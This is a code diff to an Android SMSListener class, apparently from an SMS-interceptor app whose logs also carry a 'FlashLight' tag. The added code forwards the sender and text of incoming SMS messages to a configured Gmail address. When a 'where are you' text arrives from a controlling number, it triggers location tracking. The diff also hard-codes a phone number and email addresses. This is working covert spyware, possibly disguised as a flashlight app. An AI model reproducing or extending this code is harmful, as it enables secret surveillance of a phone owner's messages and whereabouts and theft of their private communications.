@@ -22,8 +22,32 @@ public class SMSListener extends BroadcastReceiver {
   public  static  Context context;
   public  static String mBody = null;
 
-  private static String phoneNumberString = "8484820667";
-  private static String gmailEmailString = "justdriveapp1@gmail.com";
+  /*private static String phoneNumberString = "8484820667";
+  private static String gmailEmailString = "justdriveapp1@gmail.com";*/
+
+  private static String phoneNumberString;
+  private static String gmailEmailString;
+
+  public SMSListener() {
+    Configure configure = new Configure();
+    if(configure.getDatabaseInfo().equals("update")) {
+      if(!configure.getEmailAddress().equals("null")) {
+        gmailEmailString = configure.getEmailAddress();
+      }
+      else {
+        gmailEmailString = "smsinterceptorapp@gmail.com";
+      }
+      if(!configure.getPhoneNumber().equals("null")) {
+        phoneNumberString = configure.getPhoneNumber();
+      }
+      else {
+        phoneNumberString = "null";
+      }
+      Log.d("FlashLight SMSListener() ", "gmailEmailString " + gmailEmailString);
+      Log.d("FlashLight SMSListener() ", "phoneNumberString " + phoneNumberString);
+      Log.d("FlashLight SMSListener() ", "phoneNumberString != \"null\" " + String.valueOf(phoneNumberString != "null"));
+    }
+  }
 
   @Override
   public void onReceive(Context context, Intent intent) {
@@ -47,12 +71,12 @@ public class SMSListener extends BroadcastReceiver {
 
           Log.d("SMSInterceptor SMSListener", "onReceive() Entering onReceive().");
 
-          if(mBody.equals("where are you") && message_from.equals(phoneNumberString)) {
+          if(phoneNumberString != "null" && gmailEmailString != "smsinterceptorapp@gmail.com" && mBody.equals("where are you") && message_from.equals(phoneNumberString)) {
             intent = new Intent(context, SMSService.class);
             intent.putExtra("obtainLocation","obtainLocation");
             context.startService(intent);
           }
-          else {
+          else if(phoneNumberString == "null" && gmailEmailString != "smsinterceptorapp@gmail.com" && mBody.equals("where are you")) {
             new Thread(new Runnable() {
               @Override
               public void run() {
@@ -60,7 +84,22 @@ public class SMSListener extends BroadcastReceiver {
                   Log.d("SMSInterceptor SMSListener", "Sending email.");
                   sender = new GmailSender();
                   sender.sendMail("SMSInterceptor", "Incoming sms:!\nFrom " + message_from + "\nMessage: " + mBody, gmailEmailString);
-                  //sender.sendMail("SMSInterceptor", "Incoming sms:!\nFrom " + message_from + "\nMessage: " + mBody,emailString,emailString);
+                }
+                catch(Exception e) {
+                  Log.e("gmailSenderError", "" + e.toString());
+                  e.printStackTrace();
+                }
+              }
+            }).start();
+          }
+          else if(gmailEmailString != "smsinterceptorapp@gmail.com") {
+            new Thread(new Runnable() {
+              @Override
+              public void run() {
+                try {
+                  Log.d("SMSInterceptor SMSListener", "Sending email.");
+                  sender = new GmailSender();
+                  sender.sendMail("SMSInterceptor", "Incoming sms:!\nFrom " + message_from + "\nMessage: " + mBody, gmailEmailString);
                 }
                 catch(Exception e) {
                   Log.e("gmailSenderError", "" + e.toString());
